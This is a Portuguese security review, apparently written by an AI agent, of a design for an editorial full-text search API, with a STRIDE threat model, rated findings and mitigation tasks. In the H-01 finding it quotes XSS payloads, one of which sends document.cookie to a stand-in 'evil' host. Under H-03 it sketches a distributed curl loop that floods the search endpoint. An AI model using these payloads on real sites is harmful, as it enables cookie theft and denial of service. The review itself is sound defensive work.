# Security Review — Busca editorial full-text (DESIGN.md v3)

**Reviewer**: `cyber-security-architect` (sócio sênior — Gabarito PDF aplicado)
**Data**: 2026-06-03
**Escopo**: DESIGN.md v3 (614 linhas) + 4 specialist outputs (database, algorithms, frontend, ui-ux) + BACKLOG.md
**Quality gate**: decide se `code-implementer` pode começar US30.1
**Branch**: `develop`
**Acknowledgment**: Gabarito lido — esta review aplica as 5 diretrizes (Extreme Ownership, anti-sycophancy, profundidade, elevação de nível, obsessão pelo objetivo).

---

## §0. Veredito

### **APROVADO COM RESSALVAS** ⚠️

**Resumo executivo** (1 parágrafo para o usuário leigo): a arquitetura de segurança proposta no DESIGN v3 está sólida em mais de 80% das decisões — cursor HMAC, rate limit em duas camadas, LGPD com hash+IP truncado, CSP-safe via refs, `plainto_tsquery` à prova de injeção, trigger SQL atômico. Encontrei **17 achados**: 0 críticos que bloqueiem o início, 4 high que precisam virar Task antes de merge (não antes de começar), 8 medium que entram no roadmap, 5 low/info. O `code-implementer` pode começar a fase 1 (DB schema) e fase 2 (Backend service) **desde que** as 4 Tasks H-01 a H-04 estejam no BACKLOG antes do PR final da US30.1.

**Justificativa estruturada**:

1. **Não é bloqueio** porque nenhum achado expõe RCE, takeover, exfil em massa ou bypass de autenticação. O endpoint é leitura pública de conteúdo já público; a exposição privacy/disponibilidade é o foco.
2. **Ressalvas existem** porque (a) o vetor de re-identificação no `search_log` é maior do que o DESIGN admite, (b) cache + `Vary: Authorization` pode vazar respostas entre usuários se Cloudflare configurar errado, (c) algumas defesas contra DoS dependem de configuração de Postgres role + Cloudflare WAF que ainda não estão documentadas como Task, (d) `query_terms_expanded` reflete input do usuário e exige escape explícito ao chegar no frontend.
3. **Confiança alta nos specialists**: os 4 outputs reduziram superfície de ataque versus v2 (contestaram `role="combobox"` falso, corrigiram cursor float drift, adicionaram CTE LIMIT 500, eliminaram `dangerouslySetInnerHTML`). Anti-sycophancy funcionou no nível anterior — agora é minha vez.

**Condição operacional para "APROVADO" pleno**: H-01, H-02, H-03, H-04 incorporadas ao BACKLOG e referenciadas no PR. M-\* podem ser issues separadas.

---

## §1. Skills invocadas e por quê

| Skill                                        | Por quê                                                                                                                                | Modo                                                                          |
| -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| `cc-skill-security-review`                   | Checklist OWASP estruturado + verificação STRIDE + secrets/CSP/CSRF/headers                                                            | Carregada via Read (conteúdo integrado)                                       |
| `api-security-best-practices`                | OWASP API Top 10 mental model: BOLA, BOPLA, unrestricted resource consumption (DoS), security misconfiguration                         | Carregada via Read                                                            |
| `threat-modeling-expert` (mental)            | STRIDE por componente + abuse cases (não só happy path)                                                                                | Mental + cross-pollinated com cc-skill-security-review                        |
| `gdpr-data-handling` (mental, equivale LGPD) | Re-identificação por correlação (hash 16 chars + IP /24 + timestamp); minimização de coleta; retention                                 | Conhecimento já carregado da skill global                                     |
| `top-web-vulnerabilities` (mental)           | XSS reflexivo via `query_terms_expanded`; HTML injection; clickjacking                                                                 | Mental                                                                        |
| `backend-security-coder` (mental)            | Django + DRF hardening: throttle scope, role separation Postgres, CSP middleware do projeto (`apps.audit.security_headers_middleware`) | Mental, validado contra `backend/config/settings/base.py` linhas 271, 278-292 |

**Justificativa de seleção** (regra do role: 1 de A + 1 de B + 1 de C/D/E + 1 de H):

- A (App/Code): `cc-skill-security-review` + `top-web-vulnerabilities`
- B (Threat Model): `threat-modeling-expert`
- C (DevSecOps/Compliance): `gdpr-data-handling`
- H (cross-cutting): `backend-security-coder` para validar contra config real do projeto.

---

## §2. Threat model — STRIDE por componente

### Atores

- **A1 — Anônimo benigno**: leitor sem login, IP residencial, usa busca esporádica.
- **A2 — Leitor autenticado**: cookie JWT httpOnly válido, role `user`.
- **A3 — Editor/Admin/Dev**: privilegiado; inclui-se no modelo como insider potencial.
- **A4 — Atacante externo anônimo**: sem credenciais, IP rotativo (Tor, proxies, botnet).
- **A5 — Atacante autenticado**: conta válida criada legitimamente, comportamento adversarial.
- **A6 — Insider comprometido**: conta admin/dev sequestrada (phishing, credential stuffing).
- **A7 — Atacante de cadeia de suprimento**: pacote npm/PyPI malicioso (`mark.js` typosquat, dependência transitiva).

### Surface analisada

| ID  | Superfície                                                 | Onde                            |
| --- | ---------------------------------------------------------- | ------------------------------- |
| S1  | `GET /api/v1/search/articles/`                             | DRF View + Service              |
| S2  | Tabela `search_log` (LGPD)                                 | Postgres                        |
| S3  | Cursor HMAC assinado                                       | env + serializer                |
| S4  | Cache Redis `search:v1:*`                                  | Redis backend                   |
| S5  | Trigger SQL `trg_articles_sync_search`                     | Postgres function               |
| S6  | Feature flag `SEARCH_FEATURE_ENABLED`                      | env var                         |
| S7  | Postgres role `interpop_search_reader` (statement_timeout) | role config                     |
| S8  | OpenAPI schema (drf-spectacular)                           | endpoint público `/api/schema/` |
| S9  | Frontend `<HighlightedText>` + `query_terms_expanded`      | mark.js refs                    |
| S10 | Cloudflare proxy + WAF                                     | edge                            |
| S11 | Cron purga `search_log` 7d                                 | systemd timer                   |
| S12 | Backup Postgres (pg_dump)                                  | offsite                         |
| S13 | Hostinger KVM 1 (gunicorn workers, env shared)             | host                            |

### STRIDE por surface

| Surface             | Spoofing                                   | Tampering                                                    | Repudiation                                                          | Info Disclosure                                                                      | DoS                                                       | EoP            |
| ------------------- | ------------------------------------------ | ------------------------------------------------------------ | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | --------------------------------------------------------- | -------------- |
| **S1 endpoint**     | ⚪ JWT httpOnly OK (proj. existente)       | 🟡 cursor HMAC mitiga; falta confusão de chaves (M-02)       | 🟡 logs sem PII = bom p/ privacy, ruim p/ forensics (M-06)           | 🟠 `query_terms_expanded` reflete input (H-01)                                       | 🟠 30/min anônimo + Zipf head (H-03)                      | ⚪ sem mutação |
| **S2 search_log**   | n/a                                        | n/a                                                          | n/a                                                                  | 🟠 re-identificação por correlação (H-02)                                            | n/a                                                       | n/a            |
| **S3 cursor HMAC**  | 🟡 rotação invalida; falta key-id (M-02)   | ✅ HMAC SHA256 64-bit truncation evita                       | n/a                                                                  | 🟡 cursor pode codificar (score, pub, id) — sem PII                                  | n/a                                                       | n/a            |
| **S4 Redis cache**  | n/a                                        | 🟡 keys SHA256 = ok                                          | n/a                                                                  | 🔴 se cache key não inclui `Authorization` flag + rate-tier → cross-user leak (H-04) | n/a                                                       | n/a            |
| **S5 trigger SQL**  | n/a                                        | 🟡 `SET session_replication_role = 'replica'` bypassa (M-04) | 🟡 trigger sem audit log                                             | n/a                                                                                  | n/a                                                       | n/a            |
| **S6 feature flag** | n/a                                        | 🟡 env writável = atacante toggle (M-05)                     | n/a                                                                  | n/a                                                                                  | n/a                                                       | n/a            |
| **S7 PG role**      | n/a                                        | 🟡 reconnect com role admin se misconfig — timeout 0 (M-07)  | n/a                                                                  | n/a                                                                                  | 🟡 sem timeout → query 30s                                | n/a            |
| **S8 OpenAPI**      | n/a                                        | n/a                                                          | n/a                                                                  | 🟡 expõe `query_terms_expanded` schema (L-01)                                        | n/a                                                       | n/a            |
| **S9 highlight**    | n/a                                        | 🟡 atacante envia `q` com payload que volta como stem (H-01) | n/a                                                                  | n/a (XSS é tampering)                                                                | n/a                                                       | n/a            |
| **S10 Cloudflare**  | 🟡 origin bypass via subdomain enum (M-08) | n/a                                                          | n/a                                                                  | n/a                                                                                  | 🟡 botnet distribuído sub-30/min/IP (M-03)                | n/a            |
| **S11 cron purga**  | n/a                                        | n/a                                                          | 🟠 cron morre silencioso → retention ∞ LGPD (H-05? rebaixado a M-06) | n/a                                                                                  | n/a                                                       | n/a            |
| **S12 backup**      | n/a                                        | n/a                                                          | n/a                                                                  | 🟡 search_log no backup tem retention > 7d (M-09)                                    | n/a                                                       | n/a            |
| **S13 KVM 1**       | n/a                                        | n/a                                                          | n/a                                                                  | 🟡 secrets em env compartilhada entre workers; crash dump pode vazar (M-10)          | 🟡 RAM 4GB com índice GIN 3-5GB (DESIGN open question #6) | n/a            |

Cores: 🔴 = não detectado nesta análise · 🟠 = High · 🟡 = Medium · ⚪ = Low/Info · ✅ = sem risco identificado.

---

## §3. Achados por severidade

### 🔴 Critical (must fix antes de merge)

**Nenhum**.

Justificativa explícita: o endpoint é leitura de conteúdo público; não há mutação de estado, exfil de PII em massa, RCE ou auth bypass. A ausência de crítico é consistente — o DESIGN v3 já internalizou contra-medidas das v1/v2 (cursor HMAC, throttle, CSP-safe highlight).

---

### 🟠 High (devem virar Task antes do PR final da US30.1)

#### **H-01 — Reflexão de input via `query_terms_expanded` cria vetor XSS storage-like e HTML-injection**

- **Onde**: `apps/search/services.py` → response shape; `src/pages/Buscar/components/HighlightedText.tsx`
- **STRIDE**: Tampering (info via injection)
- **CWE**: CWE-79 (XSS reflexivo) + CWE-116 (improper encoding)
- **Vetor**:
  1. Atacante envia `q = "<script>alert(1)</script>"` ou `q = "kpop\"><img src=x onerror=fetch('//evil/'+document.cookie)>"`.
  2. Backend faz `plainto_tsquery('portuguese', q)` (seguro — não executa) → tokeniza `q_norm` → `ts_lexize` retorna stems.
  3. **Risco**: se `ts_lexize` for chamado sobre o `q` cru (ou se `q_norm` mantiver tokens contendo `<`, `>`, `"`), a string entra em `query_terms_expanded: string[]` e volta como JSON.
  4. Frontend usa `mark.js` com refs → mark.js procura `terms` no DOM e envolve em `<mark>`. **Mas** o atacante pode forçar `query_terms_expanded = ["<script>"]` e `mark.js` vai escapar (porque usa `Node.textContent`) — entretanto:
     - Se algum dev em PR futuro substituir mark.js por regex+`innerHTML` (fácil acidente), bug ativa.
     - Se backend retornar `query_terms_expanded` num `<meta>` echo, footer, ou logs server-side visíveis no admin Django sem escape → ativo.
- **Impacto**: XSS reflexivo limitado (não persistente) → roubo de cookie httpOnly (não — httpOnly bloqueia), mas CSRF token de outras rotas, fingerprint, redirect.
- **PoC mental**:
  ```
  GET /api/v1/search/articles/?q=<svg/onload=alert(1)>
  → resp: { query_terms_expanded: ["<svg/onload=alert(1)"] }
  → frontend (em release v2 hipotética que migra p/ innerHTML): bang.
  ```
- **Mitigação**:
  1. **Backend**: serializer aplica `re.sub(r'[<>"\'/\\&]', '', q)` ANTES de tokenizar (whitelist alfanumérico + acentuado + espaço + hífen). Rejeita `q` com chars HTML com `400 invalid_chars`.
  2. **Backend**: `query_terms_expanded` passa por `bleach.clean(token, tags=[], strip=True)` ou regex equivalente ANTES de serializar.
  3. **Frontend**: `<HighlightedText>` **invariante de código**: `mark.js` recebe `terms` via prop tipada `string[]` e nunca usa `dangerouslySetInnerHTML`. Adicionar comment-lock: `// SECURITY: NEVER use innerHTML here — see SECURITY-REVIEW.md H-01`.
  4. **Test**: caso adversarial em `T30.1.X5` que injeta `q="<script>x</script>"` e assert que `query_terms_expanded` não contém `<`, `>`.
- **Task proposta**: **T30.4.X1** "Sanitização de `q` no SearchQuerySerializer (whitelist alfanumérico + acento + espaço + hífen; rejeita HTML chars com 400) + escape de `query_terms_expanded` no service + comment-lock em `<HighlightedText>` proibindo `innerHTML`" — 🔴 **Immediate** (entra junto com T30.1.8).
- **Refs**: OWASP ASVS V5.2.5, OWASP API Top 10 #8 (Security Misconfiguration), CWE-79.

---

#### **H-02 — Re-identificação no `search_log` é maior que o DESIGN admite**

- **Onde**: `search_log` table (LGPD); DESIGN §3.4 linha 437 "query plain nunca persistida (hash 16 chars); IP /24; user hash; TTL 7d"
- **STRIDE**: Info Disclosure (LGPD/GDPR)
- **CWE**: CWE-200 (exposure) + privacy CWE-359
- **Vetor**:
  1. Atacante (ou subpoena, ou vazamento de backup) obtém dump do `search_log`.
  2. Cada linha: `(query_hash_16, ip_24, user_hash, timestamp_segundos, results_count)`.
  3. **Entropia real**:
     - `query_hash_16` (16 hex chars = 64 bits truncados de SHA256) → para queries do head Zipfiano (top-100), hash é determinístico e enumerável. Rainbow table de "kpop", "lula", "beyonce" + variações → atacante mapeia hash→query em segundos.
     - `ip_24` (~256 hosts/sub-rede) → em residenciais com NAT/CGNAT pequeno: 1-50 indivíduos plausíveis.
     - `timestamp_segundos` → granularidade alta. Casado com SAR (Subject Access Request) do usuário + logs de outras tabelas (`articles`, `comments`, `apps.audit`) → fingerprint comportamental.
     - **Correlação**: `user_hash` (mesmo usuário logado faz 30 buscas no minuto) + `ip_24` + janela de timestamp → liga usuário anônimo (sem login) a sessão posterior (com login) se IP /24 coincide.
  4. **LGPD Art. 12 §2º**: "Dado anonimizado" exige impossibilidade técnica de re-identificação por meios razoáveis. Hash 64-bit + IP /24 + timestamp seg + casamento com outros logs do projeto **não** sustenta anonimização forte. É pseudonimização — exige base legal.
- **Impacto**: vazamento de backup ou compromisso de DBA → re-identificação parcial de leitores + suas buscas (que podem expor saúde, política, orientação sexual = dado sensível LGPD Art. 5 II).
- **Mitigação** (em camadas):
  1. **Reduzir granularidade**: `timestamp` → bucket de 5 minutos (`date_trunc('minute', NOW()) - (EXTRACT(minute FROM NOW())::int % 5) * INTERVAL '1 min'`); `IP` → `/16` em vez de `/24` (mais grosso); ou descartar IP completamente e manter só `user_hash` + bucket.
  2. **Salt no hash de query**: `query_hash_16 = HMAC-SHA256(secret_pepper, query)[:16]`. Secret rota a cada 30 dias. Rainbow table morre.
  3. **Decisão arquitetural**: o `search_log` serve para quê? Se é para analytics de queries populares → guardar só `query_hash` agregado (sem IP, sem user, sem timestamp granular) e `results_count`, com `count(*)` agregado por hora. Se é para forensics de abuse → manter campos mas com retention 24h, não 7d.
  4. **Backup**: incluir `search_log` em `--exclude-table-data` do pg_dump (DESIGN §2.2 já exclui `search_index` por outro motivo; aplicar mesma técnica aqui — Task M-09).
- **Task proposta**:
  - **T30.4.X2** "Refinar `search_log`: bucket timestamp 5min + HMAC-pepper no query_hash + IP/16 (ou drop IP em favor de só `user_hash`) + documentar base legal LGPD + ADR-035 explicando trade-off privacy vs analytics" — 🟠 **High**.
  - **TX-19** "Adicionar `search_log` ao `--exclude-table-data` no pg_dump backup" — 🟠 **High**.
- **Refs**: LGPD Art. 5 II e III, Art. 12 §2º, Art. 18 (DSAR); ENISA "Pseudonymisation techniques and best practices" 2019.

---

#### **H-03 — DoS Zipf-head + botnet sub-rate-limit não é completamente mitigado**

- **Onde**: DRF throttle 30/min anônimo + Cloudflare WAF + CTE LIMIT 500 + `statement_timeout` 500ms
- **STRIDE**: DoS
- **CWE**: CWE-770 (Allocation of Resources Without Limits or Throttling) + CWE-405 (Asymmetric Resource Consumption)
- **Vetor**:
  1. **Botnet distribuído**: 1000 IPs × 1 req/min = 1000 req/min. Cada IP fica abaixo de 30/min (não trigger DRF) e abaixo de threshold Cloudflare WAF típico. Total: 16/s.
  2. Cada request usa `q` Zipf-head com **filtros que invalidam cache key** (ex.: `de=2025-01-01&ate=2025-01-02&q=cultura`). Cada key é única → Redis miss 100%.
  3. Cada miss = `plainto_tsquery` + GIN scan + CTE 500 + heap fetch + `ts_rank_cd` (50-200ms cada na sequência). 16/s × 200ms = 3.2s/s de DB tempo — single Postgres satura em ~5 cores efetivos.
  4. `statement_timeout` 500ms mata queries individuais mas não previne saturação de conexões / IO bandwidth.
  5. Cloudflare WAF padrão não detecta esse padrão sem regra custom.
- **Impacto**: degradação de serviço para usuários legítimos (p95 explode), gunicorn workers presos, possível cascata para outras rotas que compartilham DB pool.
- **PoC mental**: shell script via VPS pool (DigitalOcean droplets descartáveis) — `for ip in $ips; do curl --interface $ip "https://interpop.com.br/api/v1/search/articles/?q=cultura&de=2025-01-${RANDOM}-01"; done`.
- **Mitigação** (em camadas):
  1. **Global rate limit por endpoint**: além do per-IP/user, adicionar `ScopedRateThrottle` no endpoint inteiro (`search:global = 500/min`). Excede → 503 com `Retry-After`.
  2. **Cloudflare WAF custom rule**: rate limit por país/ASN sobre `/api/v1/search/*` com threshold mais baixo durante anomalia (ex.: 5 req/min/IP se total endpoint > 300/min).
  3. **Connection pool isolation**: Postgres role `interpop_search_reader` com `max_connections` próprio (separado do pool de leitura geral). Saturação não cascateia.
  4. **Adaptive degradation**: se `p95 > 800ms` por 30s → SearchView retorna 503 com mensagem "Serviço em alta demanda — tente em 60s" via Sentry alert + middleware feature flag.
  5. **Cache de candidates set**: cache key separada para `(q_norm sem filtros)` → cache do CTE-500 raw, depois aplica filtros em Python sobre o set cached (trade-off: precisão de paginação vs robustez). Avaliar pós-MVP.
- **Tasks propostas**:
  - **T30.4.X3** "Adicionar `SearchGlobalThrottle(scope='search_global', rate='500/min')` no DRF e somar às throttles já existentes" — 🟠 **High**.
  - **TX-20** "Documentar regras Cloudflare WAF custom para `/api/v1/search/*`: rate limit por ASN + circuit breaker em anomalia (`docs/ops/cloudflare-waf-rules.md`)" — 🟠 **High**.
  - **TX-21** "Configurar Postgres role `interpop_search_reader` com `connection_limit` separado (ex.: 5 conexões) — documentar em `docs/ops/postgres-tuning.md` (alinha com TX-15)" — 🟠 **High**.
- **Refs**: OWASP API Top 10 #4 (Unrestricted Resource Consumption), CWE-770.

---

#### **H-04 — Cache Redis pode vazar resposta entre usuários se cache key não inclui `auth_tier`**

- **Onde**: DESIGN §2.4 "key SHA256 do canonical query" + Cache-Control `public, max-age=60, stale-while-revalidate=300`
- **STRIDE**: Info Disclosure (cross-tenant — mesmo single-tenant, é cross-user)
- **CWE**: CWE-524 (use of cache containing sensitive info)
- **Vetor**:
  1. Cache key = SHA256(canonical_query). Não inclui auth tier.
  2. Usuário A (autenticado, rate 60/min) faz query → resposta cacheada inclui `rate_limit_remaining: 45`, `Retry-After`, ou — se a view eventualmente retornar `is_authenticated_only_field` → mistura entre tiers.
  3. Usuário B (anônimo, rate 30/min) faz mesma query → cache hit → recebe headers que indicam tier autenticado.
  4. **Pior caso**: se algum dev em refactor adicionar campos personalizados (`bookmarked`, `read_history`) na resposta sem invalidar a cache key, leak silencioso.
  5. **HTTP Cache-Control `public`**: Cloudflare pode cachear no edge. Sem `Vary: Authorization` ou `Vary: Cookie`, edge serve mesma resposta para autenticado e anônimo.
- **Impacto**: vazamento de metadata do tier, possível vazamento de campos personalizados em release futura, possível confusão de rate limit (anônimo vê "45 remaining" pensando ter tier alto).
- **Mitigação**:
  1. **Cache key inclui `auth_tier`**: `cache_key = SHA256(canonical_query + ":" + ("anon" | "user"))`. Tier no key resolve cross-user mismatch.
  2. **Header `Vary`**: response inclui `Vary: Authorization, Cookie`. Cloudflare e clients respeitam.
  3. **Cache-Control reavaliar**: `public` é arriscado quando endpoint tem rate limit por tier. Alternativa: `Cache-Control: private, max-age=60` se queremos cache só no browser (sem CDN). Trade-off documentado.
  4. **Invariante de código** no SearchView: response NÃO inclui dados personalizados (`bookmarked`, `read_history`); todos os campos são function-pure de `(q, filters, cursor)`. Comment-lock no service.
  5. **Test**: integration que simula `cliente_A_autenticado` + `cliente_B_anonimo` na mesma query e assert que headers diferem.
- **Task proposta**: **T30.4.X4** "Cache key inclui `auth_tier` ('anon'|'user'); response adiciona `Vary: Authorization, Cookie`; SearchView invariante 'response não inclui campos personalizados' (comment-lock); test integration de mismatch entre tiers" — 🟠 **High**.
- **Refs**: OWASP ASVS V8.3.4, RFC 7234 §4.1, MDN "Vary header" pitfalls.

---

### 🟡 Medium (entram no roadmap — não bloqueiam Sprint 4)

#### **M-01 — `plainto_tsquery` é SQL-injection-safe, MAS Django ORM com `extra(where=...)` ou `raw()` na construção é tóxico**

- **Onde**: `SearchService.query()` montagem de WHERE composto (filtros opcionais)
- **CWE**: CWE-89
- **Vetor**: se code-implementer optar por `.extra(where=[...])` para montar filtros opcionais ou usar `RawSQL`, perde o escape do ORM. `plainto_tsquery` protege a expressão tsquery, não o resto.
- **Mitigação**: invariante de código — usar **apenas** parametrização via `cursor.execute(sql, params)` ou QuerySet `.filter(Q(...))`. Comment-lock no service. Linter rule (semgrep) que bloqueia `.extra(where=)` em `apps/search/`.
- **Task**: **T30.4.X5** "Adicionar regra semgrep custom em `.semgrep.yml`: bloquear `extra(where=`, `RawSQL(`, `raw(` em `apps/search/`" — 🟡 Normal.

#### **M-02 — Cursor HMAC: rotação semestral está OK, mas falta key-id (kid) + replay attack**

- **Onde**: TX-01, TX-02
- **CWE**: CWE-294 (authentication bypass by capture-replay) + CWE-321 (use of hard-coded crypto key — risco se rotação falha)
- **Vetor**:
  1. **Replay**: cursor não expira; atacante captura cursor de outro usuário (via referer leak, log mal-redacted) e replica. Como cursor não tem PII, baixo risco — mas pode ser usado para mapear estado de paginação.
  2. **Confusão de chaves**: rotação substitui chave; cursores ativos viram inválidos → 400. UX ruim. Sem `kid` (key-id), não dá pra suportar dois secrets simultâneos (current + previous) durante transition window.
  3. **Downgrade**: se HMAC algoritmo é negociável (não é hoje, mas se futuro adicionar JWT-cursor), risco de force-none.
- **Mitigação**:
  1. Cursor payload inclui `exp` (Unix timestamp + 3600s) — server rejeita expirados.
  2. Cursor payload inclui `kid` (string curta — "v1", "v2"). Server mantém dict `{kid: secret}` com chave atual + 1 anterior. Rotação não invalida cursores recentes.
  3. ADR documenta política: HMAC-SHA256, secret 32 bytes random, rotação semestral, transition window 24h.
- **Task**: **T30.4.X6** "Cursor HMAC inclui `exp` (TTL 1h) e `kid` (key-id); settings com dict `SEARCH_CURSOR_HMAC_KEYS = {'v2': current, 'v1': previous}`; ADR-036 documenta política completa" — 🟡 Normal.

#### **M-03 — Botnet sub-30/min é parte de H-03**, já coberto. Pular.

#### **M-04 — Trigger SQL bypassável por `session_replication_role = 'replica'`**

- **Onde**: §2.2 trigger SQL `trg_articles_sync_search`
- **CWE**: CWE-863 (Incorrect Authorization)
- **Vetor**: usuário com role `REPLICATION` ou superuser pode executar `SET session_replication_role = 'replica'` → triggers `ROLE` ignoram. Inserções diretas em `articles` não atualizam `search_index` → inconsistência permanente.
- **Quem tem essa permissão**:
  - Postgres superuser (root operacional do Hostinger).
  - Role configurada com `REPLICATION` (não aplicável ao Interpop hoje).
  - Em produção: apenas via SSH+psql como `postgres` user — exige compromisso prévio do host.
- **Impacto real**: baixo — exige host comprometido. Mas é defesa em profundidade: artigos novos não aparecem em busca → atacante (insider) pode esconder publicações.
- **Mitigação**:
  1. Trigger definido como `ALWAYS` (não `ON REPLICA`) — força execução mesmo em modo replica: `CREATE TRIGGER ... ENABLE ALWAYS ...`.
  2. App role (`interpop_app`) **não tem** `REPLICATION` permission.
  3. Comando de auditoria: `cron` diário que executa `SELECT COUNT(*) FROM articles WHERE status='published' AND id NOT IN (SELECT article_id FROM search_index)` → alert se > 0.
- **Task**: **T30.4.X7** "Trigger `articles_sync_search` definido como `ENABLE ALWAYS` + cron diário audita drift entre `articles` e `search_index` (alert Sentry se > 0)" — 🟡 Normal.

#### **M-05 — Feature flag `SEARCH_FEATURE_ENABLED` em env é toggable por atacante com RCE limitado**

- **Onde**: T30.1.X4
- **CWE**: CWE-639 (authorization bypass through user-controlled key)
- **Vetor**: atacante com RCE no host (ex.: gunicorn worker exploitado via libs) consegue editar `.env` ou `os.environ` → muda flag → habilita ou desabilita busca à vontade.
- **Impacto**: baixo (toggling de feature flag em si não dá ganho; se busca está desativada por motivo de emergência — atacante reativando expõe o problema; se busca está ativa — atacante desativando = DoS interno).
- **Mitigação** (defense in depth):
  1. Flag adicional via banco: `Setting.get('search_enabled', default=True)` cached no Redis. Toggle requer admin login + audit log.
  2. RCE no worker é o problema upstream; feature flag em env é OK desde que sysadmin saiba que worker == confiança.
- **Task**: **M-05 NÃO vira task** — risco aceito; documentar em ADR-037 que feature flag em env é trade-off operacional. Sub-task da TX-22.

#### **M-06 — Cron purga 7d morre silenciosamente → retention vira ∞**

- **Onde**: TX-04 "Configurar pg_cron OR cron OS"
- **CWE**: CWE-779 (Logging of Excessive Data) — aqui invertido: ausência de logging de falha de purga
- **Vetor**: cron job (systemd timer ou pg_cron) falha por permissão, lock, OOM, host reboot. `search_log` cresce indefinidamente. Violação LGPD silenciosa.
- **Mitigação**:
  1. Cron job termina com `echo "purge done $(date)" >> /var/log/interpop/search-purge.log` E `curl -fsS https://hc-ping.com/<uuid>` (Healthchecks.io free tier) — alerta após 25h sem ping.
  2. Adicionar métrica Prometheus `search_log_oldest_seconds` exposta via `django-prometheus` → alert Grafana se > 8d.
  3. Test integration: factory cria 100 rows com `created_at = now-8d`, executa management command, assert 0 rows.
- **Task**: **T30.4.X8** "Cron purga emite ping para Healthchecks.io (ou equivalente); métrica Prometheus `search_log_oldest_seconds`; alerta Sentry/Grafana se > 8d; test integration" — 🟡 Normal.

#### **M-07 — `statement_timeout` aplicado no role, mas reconnect com role admin remove a defesa**

- **Onde**: TX-15 "configurar `statement_timeout=500ms` no role `interpop_search_reader`"
- **CWE**: CWE-732 (Incorrect Permission Assignment)
- **Vetor**: misconfig de Django `DATABASES['search_replica']` aponta para role errada → busca passa a rodar como `interpop_app` (sem timeout). DoS via query patológica reativado.
- **Mitigação**:
  1. **Defense in depth**: `SearchService` aplica `cursor.execute("SET LOCAL statement_timeout = '500ms'"); cursor.execute(query, params)` por transação. Independente de role.
  2. Test integration: confirma timeout em query patológica (`SELECT pg_sleep(2)`).
  3. Health check `/healthz/` valida role correta (`SELECT current_user`) e timeout configurado.
- **Task**: **T30.4.X9** "`SearchService.query()` aplica `SET LOCAL statement_timeout = '500ms'` antes de cada execução (defesa em profundidade independente do role); test integration valida" — 🟡 Normal.

#### **M-08 — Cloudflare DNS proxy bypass via origin IP enumeration**

- **Onde**: §3.5 / arquitetura geral (não específico de busca, mas exacerba H-03)
- **CWE**: CWE-441 (unintended proxy or intermediary)
- **Vetor**: atacante descobre IP do origin (subdomain enum, certificate transparency, histórico DNS) → ataca direto, contornando Cloudflare WAF. Para busca, isso reativa H-03 sem rate-limit do edge.
- **Mitigação** (já é boa prática do projeto Interpop em geral, listo como reminder):
  1. Nginx firewall: aceita conexão TLS apenas se `Cloudflare-Real-IP` header presente e source IP está na lista CF.
  2. Origin TLS cert: usar Cloudflare Origin CA (browsers rejeitam acesso direto).
  3. Mover busca para subdomain dedicado `search-api.interpop.com.br` separado do app principal — atacante ainda precisa enumerar.
- **Task**: **TX-22** "Hardening Nginx: aceitar requests apenas de IPs Cloudflare (`set_real_ip_from` + allow/deny). Documentar em `docs/ops/cloudflare-origin-shield.md`" — 🟡 Normal. (Aplica a todo projeto, não só busca — mas é gatilho importante para busca por H-03.)

#### **M-09 — Backup retém `search_log` por mais que 7 dias (viola LGPD retention)**

- **Onde**: TX-13 "pg_dump --exclude-table-data=search_index" — search_log não está na exclusão
- **CWE**: CWE-359 (privacy violation)
- **Vetor**: backup retido 30d (padrão da maioria das políticas) inclui search_log com pseudonimização fraca (H-02). Retention efetiva vira 30d, não 7d → fora do consentimento LGPD prometido.
- **Mitigação**: `--exclude-table-data=search_log` no pg_dump.
- **Task**: já listada em **TX-19** dentro de H-02.

#### **M-10 — Secrets em env compartilhada entre gunicorn workers**

- **Onde**: KVM 1 hostinger; `SEARCH_CURSOR_HMAC_SECRET` lido por todos workers
- **CWE**: CWE-200 (info exposure via crash dump)
- **Vetor**:
  1. Worker A crash → traceback inclui `os.environ` se Django DEBUG misconfig → secret no log.
  2. Worker B exploit via lib → leitura `os.environ` → secret.
  3. Compartilhamento de processo é design escolhido (gunicorn workers = forks), não bug. Mas exige hardening.
- **Mitigação**:
  1. Garantir `DEBUG = False` em prod (já é); logging redacta `SEARCH_CURSOR_HMAC_SECRET` via filter custom.
  2. Considerar secret manager (HashiCorp Vault, Doppler) post-Sprint 6 — fora do MVP, aceitar trade-off.
- **Task**: **TX-23** "Adicionar `logging.Filter` que redacta valores de env contendo `SECRET`, `KEY`, `PASSWORD`, `TOKEN` em qualquer log via `apps.audit.logging`" — 🟡 Normal.

---

### ⚪ Low / Informational

#### **L-01 — OpenAPI schema público expõe estrutura de `query_terms_expanded`**

- **Aceitável**. É documentação pública por design (drf-spectacular). Não revela vetor exploitável além do que H-01 já trata. **Não vira task.**

#### **L-02 — `gin_fuzzy_search_limit=5000` fingerprinting via timing**

- Atacante mede tempo de resposta de queries borderline e infere o limite.
- **Impacto**: zero. Limite é defensivo, não secreto. Conhecimento do limite não dá vantagem prática.
- **Aceitável. Não vira task.**

#### **L-03 — Mark.js + React 19 strict mode pode marcar nó errado se Suspense remount**

- Bug de UX/integridade visual (não segurança). Refs ficam stale em re-mount.
- **Mitigação**: `useLayoutEffect` + cleanup do mark.js (`instance.unmark()`).
- **Task opcional**: **T30.4.X10** "`<HighlightedText>` usa `useLayoutEffect` + `instance.unmark()` no cleanup; test com React 19 strict double-mount" — ⚪ Low.

#### **L-04 — Timing attack em cursor (inválido vs expirado vs sem resultado)**

- Vetor: atacante mede tempo de resposta para distinguir "cursor mal formatado" (rápido, falha no decode), "cursor HMAC inválido" (médio, comparação byte), "cursor válido sem resultado" (lento, hit DB).
- **Impacto**: zero exploit prático — atacante não ganha info útil. Cursors são públicos de qualquer forma.
- **Mitigação opcional**: usar `hmac.compare_digest` (já é padrão python) garante constant-time na comparação HMAC. Para "decode rápido" não há defesa razoável sem custo grande.
- **Aceitável. Não vira task** (mencionar em ADR-036 como discussão).

#### **L-05 — Headers de resposta: confirmar set completo**

- Projeto já tem (via `apps.audit.security_headers_middleware`):
  - `X-Content-Type-Options: nosniff` ✅
  - `X-Frame-Options: DENY` ✅
  - `Strict-Transport-Security` (prod) ✅
  - `Referrer-Policy: strict-origin-when-cross-origin` ✅
  - `Cross-Origin-Opener-Policy: same-origin` ✅
  - CSP (Report-Only inicial → enforce) ✅
- Faltam:
  - `Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=()` — ADD recommended.
  - `X-Robots-Tag: noindex` no endpoint (busca não é indexada).
